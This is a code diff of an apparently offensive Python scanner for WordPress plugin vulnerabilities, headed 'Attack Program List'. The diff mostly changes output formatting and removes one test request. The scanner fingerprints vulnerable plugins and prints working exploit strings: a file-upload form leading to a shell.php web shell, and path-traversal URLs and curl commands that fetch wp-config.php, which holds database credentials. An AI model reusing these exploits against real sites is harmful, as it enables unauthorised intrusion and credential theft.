@@ -17,10 +17,6 @@ class PluginCheck():
 		# 	print self.url+' connect timeout'
 		# 	return
 		#Wordpress Plugins jQuery Html5 File Upload
-
-		test = self.url+'/wp-admin/tools.php?ghostexport=true&submit=Download+Ghost+file'
-		a = requests.get(test)
-		print a.status_code
 		
 		self.path1 =   self.url+'/wp-admin/admin-ajax.php?action=load_ajax_function'
 		self.path2 =  self.url+'/wp-content/plugins/jquery-html5-file-upload/'
@@ -29,8 +25,8 @@ class PluginCheck():
 			self.re2 = requests.get(self.path1)
 			if(self.re2.text.find('{"files":[]}') != -1):
 				print "\33[31m"'[+]  Wordpress Plugins jQuery Html5 File Upload'"\033[0m"
- 				print "Exploit: \n\t""\33[32m"'<form method="POST" action="test.com/ enctype="multipart/form-data"> <input type="file" name="files[]" /><button>Upload</button>'"\033[0m"
- 				print "Shell Access :\n\t\33[32m http://www.test.com/wp-content/uploads/files/guest/shell.php \033[0m"
+ 				print "[+] Exploit: \n\t""\33[32m"'<form method="POST" action="test.com/ enctype="multipart/form-data"> <input type="file" name="files[]" /><button>Upload</button>'"\033[0m"
+ 				print "[+] Shell Access :\n\t\33[32m http://www.test.com/wp-content/uploads/files/guest/shell.php \033[0m"
  				self.count+=1
  		#Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download
 		 
@@ -38,7 +34,7 @@ class PluginCheck():
  		self.re3 = requests.get(self.path3)
  		if(self.re3.status_code ==  200):
  			print "\33[31m"'[+]  Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download'"\033[0m"
- 			print "Exploit: \n\t""\33[32m"'http://www.test.com/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10'"\033[0m"
+ 			print "[+] Exploit: \n\t""\33[32m"'http://www.test.com/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10'"\033[0m"
  			self.count+=1
 
  		#WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure
@@ -50,15 +46,15 @@ class PluginCheck():
  			self.re5 = requests.get(self.path6)
  			if(self.re5.status_code==200):
  				print  "\33[31m"'[+]  WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure'"\033[0m"
- 				print "Exploit: \n\t""\33[32m"'curl http://example.site.com/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"
- 				print " \t""\33[32m"'curl http://example.site.com/mdocs-posts/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"
+ 				print "[+] Exploit: \n\t""\33[32m"'curl http://example.site.com/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"
+ 				print "[+] \t""\33[32m"'curl http://example.site.com/mdocs-posts/?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'"\033[0m"
  				self.count+=1
  		if(self.count == 0):
- 			print "\33[32mNo Vulnerability Found\33[0m"
+ 			print "[*]\33[32mNo Vulnerability Found\33[0m"
 
 	def show(self):
 		number = 0
-		print 'Attack Program List'
+		print '[*] Attack Program List'
 		for exp in self.explist:
 			number = number+ 1
 			print "\33[31m"'[+] '+str(number)+': '+exp+"\033[0m"
